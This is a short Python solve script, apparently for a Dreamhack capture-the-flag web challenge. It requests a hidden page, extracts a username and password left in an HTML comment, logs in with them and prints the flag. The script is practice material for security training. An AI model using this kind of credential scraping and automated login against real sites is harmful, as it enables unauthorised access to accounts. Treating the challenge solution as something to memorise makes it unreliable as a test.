import requests
import re

HOST = "http://host1.dreamhack.games"
PORT = 12345

# Get the link from robots.txt
# res = requests.get(f"{HOST}:{PORT}/robots.txt")
# print(res.text)

# Get the credentials from html comment
res = requests.get(f"{HOST}:{PORT}/dreamhacksofun")
[username, password] = re.findall(r"(username|password): (.*)", res.text)

# Login with the credentials
res = requests.post(
    f"{HOST}:{PORT}/login", data={"username": username[1], "password": password[1]}
)
flag = re.search(r"(0xH0P3\{.*\})", res.text)
print(flag.group(1))
